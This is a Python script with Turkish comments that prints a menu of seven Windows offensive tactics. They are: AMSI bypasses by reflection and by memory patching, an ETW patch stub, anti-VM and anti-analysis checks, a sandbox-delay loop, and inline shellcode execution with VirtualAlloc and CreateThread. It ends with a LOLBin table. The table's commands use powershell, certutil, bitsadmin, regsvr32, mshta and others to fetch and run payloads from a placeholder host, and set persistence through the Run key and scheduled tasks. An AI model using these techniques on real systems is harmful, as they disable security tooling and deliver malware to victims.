# tactics.py

tactics = [
    """"1. AMSI Bypass: # AMSI patch (çok yaygın ama etkili)
$A = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$B = $A.GetField('amsiInitFailed','NonPublic,Static')
$B.SetValue($null,$true)
""",
    """"2. ETW Patch (PowerShell içinden):[System.Reflection.Assembly]::Load([Convert]::FromBase64String(
"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
# ... gerçek shellcode yerine ETW null-byte patch'i enjekte edilir.
""",
    """3. C#: AMSI + ETW Patch Combo: [DllImport("kernel32")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
static extern IntPtr LoadLibrary(string name);

static void PatchAMSI()
{
    var lib = LoadLibrary("amsi.dll");
    var addr = GetProcAddress(lib, "AmsiScanBuffer");
    byte[] patch = { 0x31, 0xff, 0x90 }; // xor edi, edi; nop
    Marshal.Copy(patch, 0, addr, patch.Length);
}
""",
    """4. PowerShell ile Basit Anti-Analysis: # CPU kontrolü
$cores = (Get-WmiObject -Class Win32_Processor).NumberOfLogicalProcessors
if ($cores -le 1) { exit }

# RAM kontrolü
$ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if ($ram -lt 2) { exit }

# Bilinen analiz araçları
$badProcs = "fiddler","wireshark","vboxservice","vmtoolsd","procmon","ida"
foreach ($proc in Get-Process) {
    if ($badProcs -contains $proc.Name.ToLower()) { exit }
}

# Disk manufacturer (QEMU, VBOX vb.)
$disks = Get-WmiObject Win32_DiskDrive
foreach ($disk in $disks) {
    if ($disk.Model -match "VIRTUAL|QEMU|VBOX") { exit }
}
""",
    """"5. Zamanlama: $sw = [Diagnostics.Stopwatch]::StartNew()
while ($sw.Elapsed.TotalSeconds -lt 180) {
    1..1000 | % { [Math]::Sqrt($_) > 1 }
}
""",
    """6. Inline Shellcode Execution: $code = [System.Convert]::FromBase64String("BASE64_ENCODED_SHELLCODE")
$ptr = VirtualAlloc(0, $code.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
$thread = CreateThread(0,0,$ptr,0,0,0)
""",
    """7. | LOLBin             | Açıklama & Kullanım Örneği                                                                                                                                                                                        |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **powershell.exe** | Direkt PowerShell komutunu çalıştırır. <br> Örnek: `powershell.exe -nop -w hidden -c "Invoke-WebRequest http://x.com/payload.ps1 -OutFile C:\\temp\\p.ps1; powershell -ExecutionPolicy Bypass -File C:\\temp\\p.ps1"` |
| **wmic.exe**       | WMI üzerinden process yaratır. <br> Örnek: `wmic process call create "powershell -nop -w hidden -c 'İstediğinKomut'"`                                                                                             |
| **bitsadmin.exe**  | Dosya indirirken PowerShell tetikleyebilir. <br> Örnek: `bitsadmin /transfer job1 /download /priority normal http://x.com/payload.ps1 C:\\temp\\p.ps1 & powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\p.ps1` |
| **mshta.exe**      | HTA dosyası ile PowerShell çalıştırır. <br> Örnek: `mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('powershell -nop -w hidden -c İstediğinKomut');close()"`                                  |
| **regsvr32.exe**   | Kötü amaçlı script veya DLL’yi çalıştırır. <br> Örnek: `regsvr32 /s /n /u /i:http://x.com/payload.sct scrobj.dll`                                                                                                 |
| **rundll32.exe**   | DLL ile komut çalıştırır. <br> Örnek: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication http://x.com/payload.hta"`                                                                                          |
| **cscript.exe**    | VBScript üzerinden PowerShell çalıştırabilir. <br> Örnek: `cscript.exe //B //nologo payload.vbs` içinde PowerShell komutu olabilir.                                                                               |
| **wscript.exe**    | Aynı şekilde VBScript veya JScript kullanır. <br> Örnek: `wscript.exe payload.vbs`                                                                                                                                |
| **msbuild.exe**    | MSBuild projelerinde PowerShell çalıştırılabilir. <br> Örnek: MSBuild XML içinden `<Exec Command="powershell -nop -w hidden -c İstediğinKomut"/>`                                                                 |
| **reg.exe**        | Registry değişikliği yaparak PowerShell tetiklenebilir. <br> Örnek: `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyScript /t REG_SZ /d "powershell -windowstyle hidden -File C:\\temp\\p.ps1"`    |
| **certutil.exe**   | Dosya indirir, PowerShell tetiklenir. <br> Örnek: `certutil.exe -urlcache -split -f http://x.com/payload.ps1 C:\\temp\\p.ps1 & powershell -ExecutionPolicy Bypass -File C:\\temp\\p.ps1`                              |
| **schtasks.exe**   | Zamanlanmış görev oluşturup PowerShell çalıştırır. <br> Örnek: `schtasks /create /tn "Task1" /tr "powershell -nop -w hidden -c İstediğinKomut" /sc once /st 00:00`                                                |
| **at.exe**         | (Eski ama hala bazı sistemlerde var) <br> Örnek: `at 00:00 /interactive powershell -nop -w hidden -c İstediğinKomut`                                                                                              |
"""
]

def main():
    print("Taktik listesinden bir sayı seç (1-7):")
    for tactic in tactics:
        print(tactic.split(".")[0] + ". Taktiği görmek için " + tactic.split(".")[0] + ".")

    try:
        choice = int(input("Seçimin: "))
        if 1 <= choice <= len(tactics):
            print("\nSeçilen Taktik:\n" + tactics[choice-1])
        else:
            print("Lütfen 1 ile 7 arasında bir sayı gir.")
    except ValueError:
        print("Geçerli bir sayı gir lütfen.")

if __name__ == "__main__":
    main()
